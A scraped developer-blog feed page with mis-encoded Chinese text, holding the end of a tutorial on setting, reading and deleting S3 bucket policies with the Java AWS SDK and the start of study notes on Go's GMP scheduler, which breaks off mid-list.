a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>S3æ˜¯å¹¿æ³›ä½¿ç”¨å¯¹è±¡å­˜å‚¨æœåŠ¡ã€‚</p>
<p>å½“ä½¿ç”¨äº†S3æˆ–è€…S3å…¼å®¹æœåŠ¡ä½œå¯¹è±¡å­˜å‚¨æœåŠ¡æ—¶ï¼Œå…ä¸äº†è¦è¿›è¡Œè®¾ç½®æ¡¶ç­–ç•¥ã€‚æœ‰å¾ˆå¤šç§æ–¹æ³•å¯ä»¥è®¾ç½®æ¡¶ç­–ç•¥ï¼š</p>
<ul>
<li>ä½¿ç”¨webç®¡ç†é¡µé¢</li>
<li>ä½¿ç”¨S3 Browserå®¢æˆ·ç«¯ç¨‹åº</li>
<li>AWS CLI å‘½ä»¤è¡Œå®¢æˆ·ç«¯</li>
</ul>
<p>è¿™äº›æ–¹æ³•è™½ç„¶å¯è¡Œï¼Œä½†æ˜¯å¢åŠ äº†å­¦ä¹ å’Œè®°å¿†çš„æˆæœ¬ã€‚ä½œä¸ºä¸€ä¸ªæ‡’äººï¼Œçµæœºä¸€åŠ¨æƒ³åˆ°äº†ä¸€ä¸ªå·æ‡’çš„åŠæ³•ï¼Œæ—¢ç„¶å·²ç»åœ¨ç¨‹åºä¸­å¼•å…¥æ˜¯AWS SDKäº†ï¼Œå¹¶ä¸”ä»£ç åº“ä¸­å·²ç»å†™å¥½äº†<code>helper</code>ç±»å’Œè¿æ¥é…ç½®ï¼Œä½•ä¸å¥½å¥½åˆ©ç”¨å®ƒå‘¢ã€‚</p>
<p>å› ä¸ºæ¡¶ç­–ç•¥æ˜¯ä½¿ç”¨jsonå®šä¹‰çš„ï¼Œè¿™æ˜¯è·¨è¯­è¨€SDKçš„é€šç”¨è¦æ±‚ã€‚æ‰€ä»¥åªè¦å®šä¹‰å¥½æ¡¶ç­–ç•¥çš„jsonï¼Œå°±å¯ä»¥äº¤ç»™SDKæ‰§è¡Œäº†ã€‚</p>
<p>ä¸¾ä¾‹ï¼šæ¯”å¦‚è¦è®¾ç½®å…¬å¼€ç­–ç•¥ï¼Œåˆ™jsonæ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2012-10-17"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"Statement"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"Sid"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"PublicReadForBucketObjects"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"Effect"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Allow"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"Principal"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"*"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"Action"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"s3:GetObject"</span><span class="hljs-punctuation">,</span>
            <span class="hljs-attr">"Resource"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"arn:aws:s3:::%s/*"</span>
        <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ä»¥ä¸Šjsonï¼Œæ—¢å¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™SDKï¼Œåˆå¯ä»¥ç›´æ¥å®šä¹‰åœ¨ä»£ç ä¸­ç›´æ¥ä½¿ç”¨ï¼Œæˆ–è€…å®šä¹‰ä¸€ç»„ç­–ç•¥æ–¹ä¾¿ç›´æ¥ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-0">è®¾ç½®æ¡¶ç­–ç•¥</h2>
<p>è°ƒç”¨putBucketPolicyæ–¹æ³•å®ç°ï¼Œæ¡¶ç­–ç•¥è®¾ç½®ã€‚åœ¨æ¡¶ç­–ç•¥çš„jsonä¸­<code>%s</code>ï¼Œæ˜¯ç”¨æ¥è®¾ç½®æ¡¶åçš„å ä½ç¬¦ï¼Œæ–¹ä¾¿åŠ¨æ€æ›¿æ¢ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBucketPolicy</span><span class="hljs-params">(String bucketName, String bucketPolicyJson)</span> {

    <span class="hljs-type">PutBucketPolicyRequest</span> <span class="hljs-variable">policyRequest</span> <span class="hljs-operator">=</span> PutBucketPolicyRequest.builder()
            .bucket(bucketName)
            .policy(String.format(bucketPolicyJson, bucketName))
            .build();
    
    s3Client.putBucketPolicy(policyRequest);
}
</code></pre>
<h2 data-id="heading-1">æŸ¥è¯¢æ¡¶ç­–ç•¥</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getBucketPolicy</span><span class="hljs-params">(String bucketName)</span> {

    <span class="hljs-type">GetBucketPolicyRequest</span> <span class="hljs-variable">policyRequest</span> <span class="hljs-operator">=</span> GetBucketPolicyRequest.builder()
            .bucket(bucketName)
            .build();

    <span class="hljs-type">GetBucketPolicyResponse</span> <span class="hljs-variable">policyResponse</span> <span class="hljs-operator">=</span> s3Client.getBucketPolicy(policyRequest);

    <span class="hljs-type">String</span> <span class="hljs-variable">policyJson</span> <span class="hljs-operator">=</span> policyResponse.policy();

    <span class="hljs-keyword">return</span> policyJson;
}
</code></pre>
<h2 data-id="heading-2">åˆ é™¤æ¡¶ç­–ç•¥</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteBucketPolicy</span><span class="hljs-params">(String bucketName)</span> {
    <span class="hljs-type">DeleteBucketPolicyRequest</span> <span class="hljs-variable">policyRequest</span> <span class="hljs-operator">=</span> DeleteBucketPolicyRequest.builder()
            .bucket(bucketName)
            .build();

    s3Client.deleteBucketPolicy(policyRequest);
}
</code></pre>
<h2 data-id="heading-3">æ€»ç»“</h2>
<p>é€šè¿‡ä»¥ä¸ŠAPIçš„è°ƒç”¨ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„è¿›è¡Œæ¡¶ç­–ç•¥çš„ç®¡ç†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GMP è°ƒåº¦å™¨æ·±åº¦å­¦ä¹ ç¬”è®°]]></title>    <link>https://juejin.cn/post/7594350054090686506</link>    <guid>https://juejin.cn/post/7594350054090686506</guid>    <pubDate>2026-01-12T14:45:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594350054090686506" data-draft-id="7594485030232997929" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GMP è°ƒåº¦å™¨æ·±åº¦å­¦ä¹ ç¬”è®°"/> <meta itemprop="keywords" content="åç«¯,Go"/> <meta itemprop="datePublished" content="2026-01-12T14:45:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç‚æ˜‡"/> <meta itemprop="url" content="https://juejin.cn/user/534829144487531"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GMP è°ƒåº¦å™¨æ·±åº¦å­¦ä¹ ç¬”è®°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/534829144487531/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç‚æ˜‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T14:45:38.000Z" title="Mon Jan 12 2026 14:45:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒæ¦‚å¿µï¼ˆç†è®ºæ„å»ºï¼‰</h2>
<h3 data-id="heading-1">1. GMP ä¸‰å¤§æ ¸å¿ƒç»„ä»¶</h3>
<h4 data-id="heading-2">G (Goroutine)</h4>
<ul>
<li><strong>å®šä¹‰</strong>ï¼šä»£è¡¨ä¸€ä¸ª Goroutineï¼ŒåŒ…å«äº†å‡½æ•°æŒ‡é’ˆã€æ ˆä¿¡æ¯ã€çŠ¶æ€ç­‰</li>
<li><strong>é‡è¦çŠ¶æ€</strong>ï¼š
<ul>
<li><code>_Gidle</code>: åˆšåˆšåˆ†é…ï¼Œè¿˜æœªåˆå§‹åŒ–</li>
<li><code>_Grunnable</code>: åœ¨è¿è¡Œé˜Ÿåˆ—ä¸­ï¼Œç­‰å¾…è¢«æ‰§è¡Œ</li>
<li><code>_Grunning</code>: æ­£åœ¨æ‰§è¡Œï¼Œå·²ç»å’Œ M ç»‘å®š</li>
<li><code>_Gsyscall</code>: æ­£åœ¨æ‰§è¡Œç³»ç»Ÿè°ƒç”¨</li>
<li><code>_Gwaiting</code>: è¢«é˜»å¡ï¼ˆç­‰å¾… channelã€é”ç­‰ï¼‰</li>
<li><code>_Gdead</code>: åˆšåˆšé€€å‡ºæˆ–æ­£åœ¨è¢«åˆå§‹åŒ–</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3">M (Machine)</h4>
<ul>
<li><strong>å®šä¹‰</strong>ï¼šæ“ä½œç³»ç»Ÿçº¿ç¨‹çš„æŠ½è±¡ï¼ŒçœŸæ­£æ‰§è¡Œ Goroutine çš„å®ä½“</li>
<li><strong>ç‰¹ç‚¹</strong>ï¼š
<ul>
<li>M å¿…é¡»æŒæœ‰ P æ‰èƒ½æ‰§è¡Œ G</li>
<li>æ•°é‡å¯ä»¥åŠ¨æ€å¢é•¿ï¼ˆä¸Šé™é»˜è®¤ 10000ï¼‰</li>
<li>å­˜åœ¨ç‰¹æ®Šçš„ M0 å’Œç³»ç»Ÿç›‘æ§çº¿ç¨‹ sysmon</li>
</ul>
</li>
</ul>
<h4 data-id="heading-4">P (Processor)</h4>
<ul>
<li><strong>å®šä¹‰</strong>ï¼šé€»è¾‘å¤„ç†å™¨ï¼Œä»£è¡¨æ‰§è¡Œ Go ä»£ç æ‰€éœ€çš„èµ„æº</li>
<li><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š
<ul>
<li>ç»´æŠ¤æœ¬åœ°å¯è¿è¡Œé˜Ÿåˆ— <code>runq</code>ï¼ˆç¯å½¢é˜Ÿåˆ—ï¼Œæœ€å¤š 256 ä¸ª Gï¼‰</li>
<li>æŒæœ‰ mcacheï¼ˆç”¨äºå†…å­˜åˆ†é…ï¼‰</li>
<li>GOMAXPROCS å†³å®š P çš„æ•°é‡ï¼ˆé»˜è®¤ç­‰äº CPU æ ¸å¿ƒæ•°ï¼‰</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">2. GMP æ¨¡å‹çš„æ¼”è¿›</h3>
<pre><code class="hljs language-less" lang="less">æ—§æ¨¡å‹ï¼ˆ<span class="hljs-selector-tag">Go</span> <span class="hljs-number">1.0</span>ï¼‰: <span class="hljs-selector-tag">G</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">M</span> ç›´æ¥ç»‘å®š
é—®é¢˜ï¼šå…¨å±€é˜Ÿåˆ—ç«äº‰æ¿€çƒˆï¼Œé”å¼€é”€å¤§

æ–°æ¨¡å‹ï¼ˆ<span class="hljs-selector-tag">Go</span> <span class="hljs-number">1.1</span>+ï¼‰: <span class="hljs-selector-tag">G</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">P</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">M</span> ä¸‰å±‚ç»“æ„
ä¼˜åŠ¿ï¼š
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">P</span> çš„æœ¬åœ°é˜Ÿåˆ—å‡å°‘é”ç«äº‰
  <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Work</span> <span class="hljs-selector-tag">Stealing</span> æé«˜ <span class="hljs-selector-tag">CPU</span> åˆ©ç”¨ç‡
  <span class="hljs-selector-tag">-</span> ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œ<span class="hljs-selector-tag">M</span> å’Œ <span class="hljs-selector-tag">P</span> è§£ç»‘ï¼Œ<span class="hljs-selector-tag">P</span> å¯ä»¥ç»§ç»­è¢«å…¶ä»– <span class="hljs-selector-tag">M</span> ä½¿ç”¨
</code></pre>
<h3 data-id="heading-6">3. è°ƒåº¦å™¨çš„å…³é”®æœºåˆ¶</h3>
<h4 data-id="heading-7">è°ƒåº¦æ—¶æœº</h4>
<ol>
<li><strong>ä¸»åŠ¨è°ƒåº¦</strong>ï¼šGoroutine è°ƒç”¨ <code>runtime.Gosched()</code> ä¸»åŠ¨è®©å‡º CPU</li>
<li><strong>è¢«åŠ¨è°ƒåº¦</strong>ï¼šChannel é˜»å¡ã€é”ç­‰å¾…ã€ç½‘ç»œ IO ç­‰</li>
<li><strong>æŠ¢å å¼è°ƒåº¦</strong>ï¼š
<ul>
<li>åä½œå¼æŠ¢å ï¼ˆGo 1.13-ï¼‰ï¼šå‡½æ•°è°ƒç”¨æ—¶æ£€æŸ¥æŠ¢å æ ‡è®°</li>
<li>åŸºäºä¿¡å·çš„å¼‚æ­¥æŠ¢å ï¼ˆGo 1.14+ï¼‰ï¼šsysmon é€šè¿‡ä¿¡å·å¼ºåˆ¶æŠ¢å é•¿æ—¶é—´è¿è¡Œçš„ G</li>
</ul>
</li>
</ol>
<h4 data-id="heading-8">Work Stealingï¼ˆå·¥ä½œçªƒå–ï¼‰</h4>
<ul>
<li>å½“ P çš„æœ¬åœ°é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œä¼šå°è¯•ä»ä»¥ä¸‹ä½ç½®çªƒå– Gï¼š
<ol>
<li>å…¨å±€é˜Ÿåˆ—ï¼ˆéœ€è¦åŠ é”ï¼‰</li>
<li>å…¶ä»– P çš„æœ¬åœ°é˜Ÿåˆ—ï¼ˆçªƒå–ä¸€åŠï¼‰</li>
<li>netpollerï¼ˆæ£€æŸ¥æ˜¯å¦æœ‰å°±ç»ªçš„ç½‘ç»œ IOï¼‰</li>
</ol>
</li>
</ul>
<h4 data-id="heading-9">Hand Offï¼ˆç§»äº¤ï¼‰</h4>
<ul>
<li>å½“ M å› ç³»ç»Ÿè°ƒç”¨é˜»å¡æ—¶ï¼Œä¼šå°† P ç§»äº¤ç»™å…¶ä»–ç©ºé—²æˆ–æ–°å»ºçš„ M</li>
<li>ä¿è¯ P çš„æ•°é‡å§‹ç»ˆä¸å˜ï¼Œæœ€å¤§åŒ– CPU åˆ©ç”¨ç‡</li>
</ul>
<hr/>
<h2 data-id="heading-10">äºŒã€æºç å…³é”®ä½ç½®</h2>
<h3 data-id="heading-11">æ ¸å¿ƒæ–‡ä»¶</h3>
<ul>
<li><code>src/runtime/runtime2.go</code>: Gã€Mã€P ç»“æ„ä½“å®šä¹‰</li>
<li><code>src/runtime/proc.go</code>: è°ƒåº¦å™¨æ ¸å¿ƒé€»è¾‘ï¼ˆscheduleã€findrunnableã€execute ç­‰ï¼‰</li>
<li><code>src/runtime/asm_*.s</code>: æ±‡ç¼–å…¥å£ï¼ˆä¸åŒæ¶æ„ï¼‰</li>
<li><code>src/runtime/mgc.go</code>: GC ç›¸å…³</li>
</ul>
<h3 data-id="heading-12">å…³é”®å‡½æ•°è°ƒç”¨é“¾</h3>
<pre><code class="hljs language-css" lang="css">ç¨‹åºå¯åŠ¨:
rt0_go (æ±‡ç¼–) 
  -&gt; <span class="hljs-built_in">schedinit</span>() (åˆå§‹åŒ–è°ƒåº¦å™¨)
  -&gt; <span class="hljs-built_in">newproc</span>() (åˆ›å»º main goroutine)
  -&gt; <span class="hljs-built_in">mstart</span>() (å¯åŠ¨ M)
  -&gt; <span class="hljs-built_in">schedule</span>() (è¿›å…¥è°ƒåº¦å¾ªç¯)

è°ƒåº¦å¾ªç¯:
<span class="hljs-built_in">schedule</span>()
  -&gt; <span class="hljs-built_in">findrunnable</span>() (å¯»æ‰¾å¯æ‰§è¡Œçš„ G)
  -&gt; <span class="hljs-built_in">execute</span>() (æ‰§è¡Œ G)
  -&gt; <span class="hljs-built_in">goexit</span>() (G æ‰§è¡Œå®Œæ¯•)
  -&gt; <span class="hljs-built_in">schedule</span>() (å¾ªç¯)
</code></pre>
<hr/>
<h2 data-id="heading-13">ä¸‰ã€æ ¸å¿ƒæ•°æ®ç»“æ„å­—æ®µè¯¦è§£</h2>
<h3 data-id="heading-14">g ç»“æ„ä½“å…³é”®å­—æ®µ</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> g <span class="hljs-keyword">struct</span> {
    stack       stack    <span class="hljs-comment">// æ ˆå†…å­˜èŒƒå›´ [stack.lo, stack.hi)</span>
    stackguard0 <span class="hljs-type">uintptr</span>  <span class="hljs-comment">// æ ˆæº¢å‡ºæ£€æµ‹</span>
    m           *m       <span class="hljs-comment">// å½“å‰ç»‘å®šçš„ M</span>
    sched       gobuf    <span class="hljs-comment">// è°ƒåº¦ä¿¡æ¯ï¼ˆPCã€SP ç­‰å¯„å­˜å™¨ï¼‰</span>
    atomicstatus <span class="hljs-type">uint32</span>  <span class="hljs-comment">// çŠ¶æ€ï¼ˆåŸå­æ“ä½œï¼‰</span>
    goid        <span class="hljs-type">int64</span>    <span class="hljs-comment">// goroutine ID</span>
    gopc        <span class="hljs-type">uintptr</span>  <span class="hljs-comment">// åˆ›å»ºæ­¤ goroutine çš„ PCï¼ˆç”¨äºæ ˆè¿½è¸ªï¼‰</span>
    startpc     <span class="hljs-type">uintptr</span>  <span class="hljs-comment">// goroutine å‡½æ•°çš„ PC</span>
}
</code></pre>
<h3 data-id="heading-15">m ç»“æ„ä½“å…³é”®å­—æ®µ</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> m <span class="hljs-keyword">struct</span> {
    g0       *g        <span class="hljs-comment">// ç”¨äºæ‰§è¡Œè°ƒåº¦ä»£ç çš„ç‰¹æ®Š gï¼ˆæ ˆæ›´å¤§ï¼‰</span>
    curg     *g        <span class="hljs-comment">// å½“å‰è¿è¡Œçš„ G</span>
    p        puintptr  <span class="hljs-comment">// å½“å‰ç»‘å®šçš„ P</span>
    nextp    puintptr  <span class="hljs-comment">// å”¤é†’ M æ—¶ï¼Œå³å°†ç»‘å®šçš„ P</span>
    spinning <span class="hljs-type">bool</span>      <span class="hljs-comment">// æ˜¯å¦æ­£åœ¨çªƒå– G</span>
}
</code></pre>
<h3 data-id="heading-16">p ç»“æ„ä½“å…³é”®å­—æ®µ</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> p <span class="hljs-keyword">struct</span> {
    status   <span class="hljs-type">uint32</span>      <span class="hljs-comment">// P çš„çŠ¶æ€</span>
    m        muintptr    <span class="hljs-comment">// ç»‘å®šçš„ M</span>
    runqhead <span class="hljs-type">uint32</span>      <span class="hljs-comment">// æœ¬åœ°é˜Ÿåˆ—å¤´</span>
    runqtail <span class="hljs-type">uint32</span>      <span class="hljs-comment">// æœ¬åœ°é˜Ÿåˆ—å°¾</span>
    runq     [<span class="hljs-number">256</span>]guintptr <span class="hljs-comment">// æœ¬åœ°è¿è¡Œé˜Ÿåˆ—ï¼ˆå¾ªç¯é˜Ÿåˆ—ï¼‰</span>
    runnext  guintptr    <span class="hljs-comment">// ä¸‹ä¸€ä¸ªè¦è¿è¡Œçš„ Gï¼ˆä¼˜å…ˆçº§æœ€é«˜ï¼‰</span>
    gFree    *g          <span class="hljs-comment">// å·²ç»ˆæ­¢çš„ G çš„ç¼“å­˜åˆ—è¡¨</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-17">å››ã€æ ¸å¿ƒå‡½æ•°è§£æ</h2>
<h3 data-id="heading-18">1. schedule() - è°ƒåº¦å¾ªç¯å…¥å£</h3>
<pre><code class="hljs language-markdown" lang="markdown">èŒè´£ï¼šæ‰¾åˆ°ä¸‹ä¸€ä¸ªå¯è¿è¡Œçš„ Gï¼Œå¹¶æ‰§è¡Œå®ƒ
æ ¸å¿ƒé€»è¾‘ï¼š
<span class="hljs-bullet">  1.</span> æ¯è°ƒåº¦ 61 æ¬¡ï¼Œä»å…¨å±€é˜Ÿåˆ—æ‹¿ä¸€ä¸ª Gï¼ˆé˜²æ­¢å…¨å±€é˜Ÿåˆ—é¥¥é¥¿ï¼‰
<span class="hljs-bullet">  2.</span> å°è¯•ä» P çš„æœ¬åœ°é˜Ÿåˆ—è·å– G
<span class="hljs-bullet">  3.</span> å¦‚æœæ²¡æœ‰ï¼Œè°ƒç”¨ findrunnable() è¿›è¡Œå…¨å±€æœç´¢
<span class="hljs-bullet">  4.</span> è°ƒç”¨ execute() æ‰§è¡Œ G
</code></pre>
<h3 data-id="heading-19">2. findrunnable() - æŸ¥æ‰¾å¯è¿è¡Œçš„ G</h3>
<pre><code class="hljs language-markdown" lang="markdown">æŸ¥æ‰¾é¡ºåºï¼ˆWork Stealingï¼‰ï¼š
<span class="hljs-bullet">  1.</span> æœ¬åœ°é˜Ÿåˆ— (runq)
<span class="hljs-bullet">  2.</span> å…¨å±€é˜Ÿåˆ— (globrunqget)
<span class="hljs-bullet">  3.</span> netpoller (ç½‘ç»œè½®è¯¢å™¨)
